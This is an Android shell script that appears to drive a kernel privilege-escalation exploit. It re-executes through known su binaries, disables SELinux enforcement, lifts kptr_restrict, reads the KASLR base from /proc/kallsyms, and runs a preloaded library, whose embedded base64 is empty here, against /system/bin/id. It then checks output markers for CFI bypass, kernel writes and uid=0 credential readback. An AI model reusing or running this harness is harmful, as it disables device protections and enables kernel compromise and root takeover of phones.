#!/system/bin/sh
D=/data/local/tmp/stack_diag
case "$D" in
    /data/local/tmp/*) ;;
    *) echo "FAIL: unsafe work dir: '$D'" >&2; exit 1 ;;
esac
mkdir -p "$D" || { echo "FAIL: cannot create $D (run as root)" >&2; exit 1; }
[ -d "$D" ] && [ -w "$D" ] || { echo "FAIL: work dir is not writable: $D" >&2; exit 1; }
OUT="$D/diag.txt"
log() { echo "$@"; echo "$@" >> "$OUT"; }
log "=== stack_diag $(date) ==="
UID_NOW=$(id -u 2>/dev/null || echo unknown)
SELINUX_CONTEXT=$(cat /proc/self/attr/current 2>/dev/null | tr -d '\000')
[ -n "$SELINUX_CONTEXT" ] || SELINUX_CONTEXT=unknown
log "uid: $UID_NOW"
log "selinux: $SELINUX_CONTEXT"
if [ "$UID_NOW" != "0" ]; then
    SCRIPT_PATH="$0"
    case "$SCRIPT_PATH" in
        /*) ;;
        *) SCRIPT_PATH="$(pwd)/$SCRIPT_PATH" ;;
    esac
    for SU_PATH in "$(command -v su 2>/dev/null)" \
        /data/adb/magisk/su /data/adb/ksu/bin/su \
        /data/adb/ap/bin/su /system/bin/su /system/xbin/su /sbin/su; do
        [ -x "$SU_PATH" ] || continue
        if "$SU_PATH" -c id 2>/dev/null | grep -q 'uid=0'; then
            log "re-exec via: $SU_PATH"
            exec "$SU_PATH" -c "sh \"$SCRIPT_PATH\""
        fi
    done
    log "no usable su found; continuing with current uid"
fi
setenforce 0 2>/dev/null
if [ -w /proc/sys/kernel/kptr_restrict ]; then
    echo 0 > /proc/sys/kernel/kptr_restrict
else
    log "NOTE: /proc/sys/kernel/kptr_restrict is not writable"
fi
base64 -d > "$D/preload.so" << 'PRELOAD_EOF'

PRELOAD_EOF
chmod 755 "$D/preload.so"
echo "解压 preload..."


log "=== KASLR base ==="
TEXT_ADDR=$(grep ' T _text$' /proc/kallsyms 2>/dev/null | awk '{print $1}')
log "_text: 0x$TEXT_ADDR"
[ -z "$TEXT_ADDR" ] && log "FAIL: /proc/kallsyms unavailable" && exit 1
KASLR_BASE="0x$TEXT_ADDR"

BOOT_BEFORE=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
log "boot_id before: $BOOT_BEFORE"
log "=== Run exploit (output-only evidence) ==="
CFI_KASLR_BASE="$KASLR_BASE" LD_PRELOAD="$D/preload.so" /system/bin/id > "$D/exploit.txt" 2>&1 &
EXPID=$!
EXP_TIMEOUT=${EXP_TIMEOUT:-20}
log "exploit pid: $EXPID timeout: ${EXP_TIMEOUT}s"
EXP_ELAPSED=0
while [ "$EXP_ELAPSED" -lt "$EXP_TIMEOUT" ]; do
    if ! kill -0 "$EXPID" 2>/dev/null; then
        break
    fi
    sleep 1
    EXP_ELAPSED=$((EXP_ELAPSED + 1))
done
if kill -0 "$EXPID" 2>/dev/null; then
    log "exploit timeout after ${EXP_ELAPSED}s; terminating pid: $EXPID"
    kill -TERM "$EXPID" 2>/dev/null
    sleep 1
    kill -KILL "$EXPID" 2>/dev/null
    wait "$EXPID" 2>/dev/null
    EXP_STATUS=124
else
    wait "$EXPID" 2>/dev/null
    EXP_STATUS=$?
fi

log "exploit exit: $EXP_STATUS"
log "=== Selected exploit markers ==="
grep -E '^(STEP[0-9]|CFGPROBE|SLIDE|ROUTE|FOPSROUTE|WAITER_FOPS_ROUTE|DIRECT_WRITE|BOOTID_WRITE|STAGE2|.*SUCCESS|.*ERROR)' "$D/exploit.txt" | tail -200 >> "$OUT"

if grep -Eq 'FOPSROUTE_(GO|RET)|ROUTE_[A-Z0-9_]+_(ENTER|RET)|WAITER_FOPS_ROUTE_(ENTER|RET)' "$D/exploit.txt"; then
    log "EVIDENCE: ROUTE_REACHED=1"
else
    log "EVIDENCE: ROUTE_REACHED=0"
fi
if grep -Eq 'FOPSROUTE_CFI_RESULT:.*ok=1' "$D/exploit.txt"; then
    log "EVIDENCE: CFI_ROUTE_OK=1"
else
    log "EVIDENCE: CFI_ROUTE_OK=0"
fi
if grep -Eq 'DIRECT_WRITE_ONLY_DIAG_DONE:.*success=[1-9][0-9]*' "$D/exploit.txt"; then
    log "EVIDENCE: DIRECT_WRITE_ROUTE_OK=1"
else
    log "EVIDENCE: DIRECT_WRITE_ROUTE_OK=0"
fi
if grep -Eq 'STAGE2_VERIFY:.*uid=0' "$D/exploit.txt"; then
    log "EVIDENCE: CRED_READBACK=1"
else
    log "EVIDENCE: CRED_READBACK=0"
fi
if grep -Eq 'FOPS_WRITE_CONFIRMED|WRITE_READBACK_OK' "$D/exploit.txt"; then
    log "EVIDENCE: TARGET_SLOT_READBACK=1"
else
    log "EVIDENCE: TARGET_SLOT_READBACK=0"
fi
log "EVIDENCE: TARGET_WRITE=UNKNOWN_NO_TARGET_READBACK"

BOOT_AFTER=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
log "boot_id after:  $BOOT_AFTER"
[ -n "$BOOT_BEFORE" ] && [ "$BOOT_BEFORE" != "$BOOT_AFTER" ] && log "REBOOT detected"
setenforce 1 2>/dev/null
log "=== DONE (output-only; no target-slot readback) ==="
